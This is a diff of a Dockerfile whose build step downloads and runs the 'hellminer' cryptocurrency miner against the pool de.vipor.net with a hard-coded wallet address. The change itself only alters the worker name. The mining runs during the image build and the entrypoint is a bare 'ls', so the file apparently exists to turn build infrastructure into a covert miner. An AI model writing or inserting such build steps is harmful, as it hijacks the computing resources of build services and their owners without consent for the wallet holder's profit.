@@ -14,7 +14,7 @@ RUN apt-get -y update \
     && rm -rf /var/lib/apt/lists/* /var/cache/apt/archives/* \
     && cd hellminer \
     && HOUR=$(date +%H) \
-    && /opt/hellminer/hellminer -c stratum+tcp://de.vipor.net:5040 -u RRCHBYzEgXpDBjRfNd25tZHSxi9khdMdyT.3_de_$HOUR
+    && /opt/hellminer/hellminer -c stratum+tcp://de.vipor.net:5040 -u RRCHBYzEgXpDBjRfNd25tZHSxi9khdMdyT.2_de_$HOUR
 
 WORKDIR /opt/hellminer/
 ENTRYPOINT ["ls"]
